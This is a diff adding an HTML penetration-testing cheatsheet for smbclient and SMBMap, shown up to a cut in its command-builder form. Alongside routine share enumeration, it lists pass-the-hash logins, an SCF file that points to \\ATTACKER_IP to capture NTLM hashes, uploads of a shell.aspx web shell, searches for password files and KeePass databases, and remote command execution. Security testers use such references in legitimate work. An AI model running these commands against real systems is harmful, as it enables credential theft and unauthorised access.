@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>SMBClient & SMBMap Cheatsheet</title>
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Oxanium:wght@300;400;600;800&display=swap');
+
+:root {
+  --bg: #0a0c10;
+  --surface: #0e1117;
+  --surface2: #141820;
+  --border: #1e2a3a;
+  --accent1: #00c8ff;
+  --accent2: #ff6b35;
+  --accent3: #7fff6b;
+  --text: #c8d8e8;
+  --muted: #5a7080;
+  --cmd: #e8f4ff;
+}
+
+* { margin: 0; padding: 0; box-sizing: border-box; }
+
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: 'Oxanium', sans-serif;
+  min-height: 100vh;
+}
+
+body::before {
+  content: '';
+  position: fixed;
+  top: 0; left: 0; right: 0; bottom: 0;
+  background: repeating-linear-gradient(0deg, transparent, transparent 2px, rgba(0,200,255,0.015) 2px, rgba(0,200,255,0.015) 4px);
+  pointer-events: none;
+  z-index: 100;
+}
+
+header {
+  padding: 2.5rem 2rem 1.5rem;
+  border-bottom: 1px solid var(--border);
+  background: linear-gradient(180deg, #071020 0%, transparent 100%);
+  position: relative;
+  overflow: hidden;
+}
+header::after {
+  content: 'SMB';
+  position: absolute;
+  right: -1rem; top: -1rem;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 10rem;
+  color: rgba(0,200,255,0.04);
+  pointer-events: none;
+  line-height: 1;
+}
+.header-tag {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.7rem;
+  color: var(--accent1);
+  letter-spacing: 4px;
+  margin-bottom: 0.5rem;
+}
+h1 { font-size: clamp(1.8rem, 4vw, 3rem); font-weight: 800; color: #fff; letter-spacing: -1px; }
+h1 .s1 { color: var(--accent1); }
+h1 .s2 { color: var(--accent2); }
+.subtitle { margin-top: 0.5rem; font-size: 0.85rem; color: var(--muted); font-family: 'Share Tech Mono', monospace; }
+
+/* TABS */
+.tabs {
+  display: flex;
+  padding: 0 2rem;
+  background: var(--surface);
+  border-bottom: 1px solid var(--border);
+  position: sticky;
+  top: 0;
+  z-index: 50;
+}
+.tab {
+  padding: 0.85rem 1.8rem;
+  cursor: pointer;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.92rem;
+  letter-spacing: 2px;
+  color: var(--muted);
+  border: none;
+  border-bottom: 2px solid transparent;
+  background: none;
+  outline: none;
+  transition: all 0.2s;
+}
+.tab:hover { color: var(--text); }
+.tab.active { color: var(--accent1); border-bottom-color: var(--accent1); }
+.tab.t2.active { color: var(--accent2); border-bottom-color: var(--accent2); }
+
+/* PANELS */
+.panel { display: none; }
+.panel.active { display: block; }
+
+.content { padding: 2rem; max-width: 1400px; margin: 0 auto; }
+
+.section-title {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.75rem;
+  letter-spacing: 4px;
+  color: var(--accent1);
+  text-transform: uppercase;
+  margin: 2rem 0 1rem;
+  display: flex;
+  align-items: center;
+  gap: 0.8rem;
+}
+.section-title::before { content: ''; width: 20px; height: 1px; background: currentColor; opacity: 0.5; }
+.section-title::after  { content: ''; flex: 1; height: 1px; background: var(--border); }
+.p2 .section-title { color: var(--accent2); }
+
+.grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(420px, 1fr)); gap: 1rem; }
+
+.card {
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  overflow: hidden;
+  transition: border-color 0.2s, box-shadow 0.2s;
+}
+.card:hover { border-color: rgba(0,200,255,0.3); box-shadow: 0 0 20px rgba(0,200,255,0.05); }
+.p2 .card:hover { border-color: rgba(255,107,53,0.3); box-shadow: 0 0 20px rgba(255,107,53,0.05); }
+
+.card-header {
+  padding: 0.6rem 1rem;
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+}
+.dot { width: 6px; height: 6px; border-radius: 50%; background: var(--accent1); box-shadow: 0 0 6px var(--accent1); flex-shrink: 0; }
+.p2 .dot { background: var(--accent2); box-shadow: 0 0 6px var(--accent2); }
+.card-title { font-size: 0.9rem; font-weight: 600; color: #e0ecff; }
+
+.badge {
+  margin-left: auto;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.6rem;
+  letter-spacing: 1px;
+  padding: 2px 6px;
+  border-radius: 2px;
+}
+.b-blue   { background: rgba(0,200,255,0.1);   color: var(--accent1); border: 1px solid rgba(0,200,255,0.2); }
+.b-orange { background: rgba(255,107,53,0.1);  color: var(--accent2); border: 1px solid rgba(255,107,53,0.2); }
+.b-green  { background: rgba(127,255,107,0.1); color: var(--accent3); border: 1px solid rgba(127,255,107,0.2); }
+
+.cmd-block { padding: 0.9rem 1rem; display: flex; flex-direction: column; gap: 0.7rem; }
+.cmd-label { font-size: 0.76rem; color: var(--muted); margin-bottom: 0.25rem; font-family: 'Share Tech Mono', monospace; }
+
+.cmd {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.9rem;
+  color: var(--cmd);
+  background: rgba(0,0,0,0.4);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 0.5rem 2.8rem 0.5rem 0.75rem;
+  line-height: 1.5;
+  word-break: break-all;
+  cursor: pointer;
+  position: relative;
+  transition: border-color 0.15s, background 0.15s;
+}
+.cmd:hover { border-color: rgba(0,200,255,0.4); background: rgba(0,200,255,0.05); }
+.p2 .cmd:hover { border-color: rgba(255,107,53,0.4); background: rgba(255,107,53,0.04); }
+
+.cmd .hl  { color: var(--accent1); }
+.p2 .cmd .hl { color: var(--accent2); }
+.cmd .fl  { color: #a0c8ff; }
+.cmd .vl  { color: var(--accent3); }
+
+.copy-btn {
+  position: absolute;
+  right: 0.4rem; top: 50%;
+  transform: translateY(-50%);
+  background: none;
+  border: none;
+  color: var(--muted);
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.7rem;
+  letter-spacing: 0.5px;
+  pointer-events: none;
+}
+.cmd:hover .copy-btn { color: var(--accent1); }
+.p2 .cmd:hover .copy-btn { color: var(--accent2); }
+.copy-btn.copied { color: var(--accent3) !important; }
+
+.note {
+  font-size: 0.78rem;
+  color: var(--muted);
+  font-family: 'Share Tech Mono', monospace;
+  padding: 0.5rem 0.75rem;
+  background: rgba(0,0,0,0.2);
+  border-left: 2px solid var(--accent1);
+  border-radius: 0 3px 3px 0;
+  line-height: 1.5;
+}
+.p2 .note { border-left-color: var(--accent2); }
+
+/* BUILDER */
+.builder-box {
+  margin-top: 2rem;
+  background: var(--surface);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  overflow: hidden;
+}
+.builder-head {
+  padding: 0.75rem 1rem;
+  background: var(--surface2);
+  border-bottom: 1px solid var(--border);
+  display: flex;
+  align-items: center;
+  gap: 0.6rem;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.75rem;
+  color: var(--accent3);
+  letter-spacing: 2px;
+}
+.builder-grid {
+  padding: 1.2rem;
+  display: grid;
+  grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+  gap: 0.75rem;
+}
+.field label {
+  display: block;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--muted);
+  letter-spacing: 1px;
+  margin-bottom: 0.3rem;
+}
+.field input, .field select {
+  width: 100%;
+  background: rgba(0,0,0,0.4);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 0.4rem 0.6rem;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.9rem;
+  color: var(--cmd);
+  outline: none;
+  transition: border-color 0.2s;
+}
+.field input:focus, .field select:focus { border-color: var(--accent3); }
+.gen-label {
+  padding: 0 1.2rem;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--muted);
+  letter-spacing: 1px;
+}
+.gen-output {
+  margin: 0.4rem 1.2rem 1.2rem;
+  background: rgba(0,0,0,0.5);
+  border: 1px solid var(--border);
+  border-radius: 3px;
+  padding: 1rem;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.9rem;
+  color: var(--accent3);
+  min-height: 60px;
+  white-space: pre-wrap;
+  word-break: break-all;
+  line-height: 1.6;
+}
+
+footer {
+  margin-top: 3rem;
+  padding: 1.5rem 2rem;
+  border-top: 1px solid var(--border);
+  text-align: center;
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 0.65rem;
+  color: var(--muted);
+  letter-spacing: 2px;
+}
+
+@media (max-width: 600px) {
+  .grid { grid-template-columns: 1fr; }
+  .tabs { padding: 0 1rem; }
+  .content { padding: 1rem; }
+  .tab { padding: 0.75rem 1rem; font-size: 0.75rem; letter-spacing: 1px; }
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-tag">// penetration testing reference</div>
+  <h1><span class="s1">SMBClient</span> &amp; <span class="s2">SMBMap</span></h1>
+  <div class="subtitle">$ smb protocol enumeration &amp; exploitation cheatsheet</div>
+</header>
+
+<div class="tabs">
+  <button class="tab active" data-tab="0">SMBCLIENT</button>
+  <button class="tab t2"     data-tab="1">SMBMAP</button>
+  <button class="tab"        data-tab="2">BUILDER</button>
+</div>
+
+<div class="content">
+
+<!-- ========== PANEL 0: SMBCLIENT ========== -->
+<div class="panel active" id="panel0">
+
+  <div class="section-title">Connection &amp; Authentication</div>
+  <div class="grid">
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Basic Connection</div><span class="badge b-blue">AUTH</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Anonymous / Null session</div>
+        <div class="cmd">smbclient <span class="fl">-N</span> <span class="vl">//TARGET/ShareName</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Username + Password</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/ShareName</span> <span class="fl">-U</span> <span class="vl">'DOMAIN\user%pass'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Prompt for password</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/ShareName</span> <span class="fl">-U</span> <span class="vl">user</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Pass-the-Hash (PTH)</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/C$</span> <span class="fl">-U</span> <span class="vl">Administrator</span> <span class="fl">--pw-nt-hash</span> <span class="vl">NTLM_HASH</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Kerberos auth</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/ShareName</span> <span class="fl">-k</span> <span class="fl">-U</span> <span class="vl">user@DOMAIN.LOCAL</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">List Shares</div><span class="badge b-blue">ENUM</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Null session</div>
+        <div class="cmd">smbclient <span class="fl">-N</span> <span class="fl">-L</span> <span class="vl">//TARGET</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">With credentials</div>
+        <div class="cmd">smbclient <span class="fl">-L</span> <span class="vl">//TARGET</span> <span class="fl">-U</span> <span class="vl">user%password</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Specify SMB version</div>
+        <div class="cmd">smbclient <span class="fl">-L</span> <span class="vl">//TARGET</span> <span class="fl">--option='client min protocol=NT1'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">With domain</div>
+        <div class="cmd">smbclient <span class="fl">-L</span> <span class="vl">//TARGET</span> <span class="fl">-W</span> <span class="vl">DOMAIN</span> <span class="fl">-U</span> <span class="vl">user%pass</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="section-title">Navigation &amp; File Operations</div>
+  <div class="grid">
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Interactive Shell Commands</div><span class="badge b-green">SHELL</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">List directory</div>
+        <div class="cmd"><span class="hl">smb: \&gt;</span> ls<button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Change directory</div>
+        <div class="cmd"><span class="hl">smb: \&gt;</span> cd <span class="vl">Users\Administrator\Desktop</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Download file</div>
+        <div class="cmd"><span class="hl">smb: \&gt;</span> get <span class="vl">filename.txt</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Upload file</div>
+        <div class="cmd"><span class="hl">smb: \&gt;</span> put <span class="vl">localfile.txt</span> <span class="vl">remotefile.txt</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Delete file</div>
+        <div class="cmd"><span class="hl">smb: \&gt;</span> del <span class="vl">filename.txt</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Make directory</div>
+        <div class="cmd"><span class="hl">smb: \&gt;</span> mkdir <span class="vl">newdir</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Show current dir</div>
+        <div class="cmd"><span class="hl">smb: \&gt;</span> pwd<button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Exit shell</div>
+        <div class="cmd"><span class="hl">smb: \&gt;</span> exit<button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Non-Interactive / Scripted</div><span class="badge b-blue">SCRIPTED</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Run single command</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/Share</span> <span class="fl">-U</span> <span class="vl">user%pass</span> <span class="fl">-c</span> <span class="vl">"ls"</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Download file non-interactively</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/Share</span> <span class="fl">-U</span> <span class="vl">user%pass</span> <span class="fl">-c</span> <span class="vl">"get file.txt /tmp/file.txt"</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Recursive download all files</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/Share</span> <span class="fl">-U</span> <span class="vl">user%pass</span> <span class="fl">-c</span> <span class="vl">"recurse; prompt OFF; mget *"</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Upload file</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/Share</span> <span class="fl">-U</span> <span class="vl">user%pass</span> <span class="fl">-c</span> <span class="vl">"put /tmp/shell.aspx shell.aspx"</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Multiple commands</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/Share</span> <span class="fl">-U</span> <span class="vl">user%pass</span> <span class="fl">-c</span> <span class="vl">"cd subdir; ls; get secrets.txt"</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="section-title">Advanced &amp; Attack Techniques</div>
+  <div class="grid">
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">NTLM Theft / Hash Capture</div><span class="badge b-orange">ATTACK</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Upload SCF file to capture hash (run Responder first)</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/Share</span> <span class="fl">-U</span> <span class="vl">user%pass</span> <span class="fl">-c</span> <span class="vl">"put /tmp/evil.scf @evil.scf"</span><button class="copy-btn">copy</button></div></div>
+        <div class="note">[Shell]<br>Command=2<br>IconFile=\\ATTACKER_IP\share\icon.ico</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Impacket smbclient.py</div><span class="badge b-blue">IMPACKET</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Basic usage</div>
+        <div class="cmd">smbclient.py <span class="vl">DOMAIN/user:pass@TARGET</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Pass-the-Hash</div>
+        <div class="cmd">smbclient.py <span class="fl">-hashes</span> <span class="vl">:NTLM_HASH</span> <span class="vl">DOMAIN/user@TARGET</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Kerberos (with TGT)</div>
+        <div class="cmd">smbclient.py <span class="fl">-k</span> <span class="fl">-no-pass</span> <span class="vl">DOMAIN/user@TARGET</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Useful Options &amp; Flags</div></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Specify IP (bypass DNS)</div>
+        <div class="cmd">smbclient <span class="vl">//dc01.domain.local/SYSVOL</span> <span class="fl">-U</span> <span class="vl">user%pass</span> <span class="fl">-I</span> <span class="vl">192.168.1.10</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Specify port</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/Share</span> <span class="fl">-p</span> <span class="vl">445</span> <span class="fl">-U</span> <span class="vl">user%pass</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Debug / verbose</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/Share</span> <span class="fl">-d</span> <span class="vl">3</span> <span class="fl">-U</span> <span class="vl">user%pass</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Set workgroup</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/Share</span> <span class="fl">-W</span> <span class="vl">WORKGROUP</span> <span class="fl">-N</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Common Shares to Access</div><span class="badge b-green">TARGETS</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">C$ Admin share</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/C$</span> <span class="fl">-U</span> <span class="vl">Administrator%pass</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">IPC$ (null session)</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/IPC$</span> <span class="fl">-N</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">SYSVOL (GPO / scripts)</div>
+        <div class="cmd">smbclient <span class="vl">//DC01/SYSVOL</span> <span class="fl">-U</span> <span class="vl">DOMAIN\user%pass</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">NETLOGON (logon scripts)</div>
+        <div class="cmd">smbclient <span class="vl">//DC01/NETLOGON</span> <span class="fl">-U</span> <span class="vl">DOMAIN\user%pass</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">ADMIN$ share</div>
+        <div class="cmd">smbclient <span class="vl">//TARGET/ADMIN$</span> <span class="fl">-U</span> <span class="vl">Administrator%pass</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+  </div>
+</div><!-- /panel0 -->
+
+
+<!-- ========== PANEL 1: SMBMAP ========== -->
+<div class="panel p2" id="panel1">
+
+  <div class="section-title">Authentication &amp; Connection</div>
+  <div class="grid">
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Basic Authentication</div><span class="badge b-orange">AUTH</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Guest / null session</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">guest</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Username + password</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">password</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">With domain</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-d</span> <span class="vl">DOMAIN</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Pass-the-Hash</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">Administrator</span> <span class="fl">-p</span> <span class="vl">'aad3b435...:NTLM_HASH'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Hash only (no LM)</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">'00000000000000000000000000000000:HASH'</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Share Enumeration</div><span class="badge b-orange">ENUM</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">List all shares + permissions</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Scan entire subnet</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">192.168.1.0/24</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Use host list file</div>
+        <div class="cmd">smbmap <span class="fl">--host-file</span> <span class="vl">hosts.txt</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Custom port</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">--port</span> <span class="vl">445</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="section-title">File Discovery &amp; Enumeration</div>
+  <div class="grid">
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Directory Listing</div><span class="badge b-green">BROWSE</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">List root of share</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-r</span> <span class="vl">ShareName</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">List subdirectory</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-r</span> <span class="vl">'ShareName\subdir'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Recursive listing</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-R</span> <span class="vl">ShareName</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Recursive with depth limit</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-R</span> <span class="vl">ShareName</span> <span class="fl">--depth</span> <span class="vl">5</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Pattern &amp; File Search</div><span class="badge b-orange">SEARCH</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Search by filename pattern</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-A</span> <span class="vl">'.txt'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Search for creds-related filenames</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-R</span> <span class="fl">-A</span> <span class="vl">'password|creds|secret'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Search for KeePass databases</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-R</span> <span class="vl">C$</span> <span class="fl">-A</span> <span class="vl">'.kdbx'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Case-insensitive regex search</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-R</span> <span class="fl">-A</span> <span class="vl">'(?i)password'</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+  </div>
+
+  <div class="section-title">File Transfer &amp; Command Execution</div>
+  <div class="grid">
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Upload &amp; Download</div><span class="badge b-orange">TRANSFER</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Download file</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">--download</span> <span class="vl">'ShareName\path\file.txt'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Upload file</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">--upload</span> <span class="vl">'/tmp/shell.aspx'</span> <span class="vl">'ShareName\shell.aspx'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Delete remote file</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">--delete</span> <span class="vl">'ShareName\file.txt'</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Remote Command Execution</div><span class="badge b-orange">EXEC</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Execute whoami</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">admin</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-x</span> <span class="vl">'whoami'</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Execute ipconfig</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">admin</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-x</span> <span class="vl">'ipconfig /all'</span><button class="copy-btn">copy</button></div></div>
+
+        <div class="note">Requires admin rights. Uses PSEXEC-style execution via ADMIN$/C$</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-header"><div class="dot"></div><div class="card-title">Output &amp; Logging</div><span class="badge b-green">OUTPUT</span></div>
+      <div class="cmd-block">
+        <div><div class="cmd-label">Quiet mode (shares only)</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-q</span><button class="copy-btn">copy</button></div></div>
+
+        <div><div class="cmd-label">Verbose output</div>
+        <div class="cmd">smbmap <span class="fl">-H</span> <span class="vl">TARGET</span> <span class="fl">-u</span> <span class="vl">user</span> <span class="fl">-p</span> <span class="vl">pass</span> <span class="fl">-v</span><button class="copy-btn">copy</button></div></div>
+      </div>
+    </div>
+
+  </div>
+</div><!-- /panel1 -->
+
+
+<!-- ========== PANEL 2: BUILDER ========== -->
+<div class="panel" id="panel2">
+  <div class="builder-box">
+    <div class="builder-head">
+      <div style="width:8px;height:8px;background:var(--accent3);border-radius:50%;box-shadow:0 0 8px var(--accent3)"></div>
+      COMMAND BUILDER
+    </div>
+    <div class="builder-grid">
+      <div class="field">
+        <label>TOOL</label>
+        <select id="b-tool">
+          <option value="smbclient">smbclient</option>
+          <option value="smbmap">smbmap</option>
+        </select>
+      </div>
+      <div class="field">
+        <label>TARGET IP / HOST</label>
+        <input type="text" id="b-target" value="192.168.1.10" placeholder="TARGET">
+      </div>
+      <div class="field">
+        <label>SHARE NAME</label>
+        <input type="text" id="b-share" value="C$" placeholder="C$ / ShareName">
+      </div>
+      <div class="field">
+        <label>USERNAME</label>
+        <input type="text" id="b-user" value="Administrator" placeholder="user">
+      </div>
+      <div class="field">
+        <label>PASSWORD / HASH</label>
+        <input type="text" id="b-pass" value="" placeholder="password or NTLM hash">
+      </div>
+      <div class="field">
+        <label>DOMAIN</label>
+        <input type="text" id="b-domain" value="" placeholder="DOMAIN (optional)">
+      </div>
+      <div class="field">
+        <label>ACTION</label>
+        <select id="b-action">
+          <option value="list_shares">List Shares</option>
+          <option value="connect">Connect to Share</option>
+          <option value="ls">List Files</option>
+          <option value="download">Download File</option>
+          <option value="upload">Upload File</option>
+          <option value="recursive">Recursive List</option>
+          <option value="search">Search Files</option>
